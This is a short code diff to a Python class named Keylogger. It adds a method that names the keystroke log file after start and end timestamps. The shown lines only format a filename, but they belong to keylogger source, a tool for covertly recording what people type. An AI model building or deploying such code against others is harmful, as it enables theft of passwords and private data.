@@ -47,5 +47,12 @@ class Keylogger:
         
         self.log += name
 
+
+    # create a log file in current working directory that has current keylogs in 'self.log' variable
     def update_filename(self):
+
+        # filename is made with start and end timestamps
+        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
+        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
+        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"
         
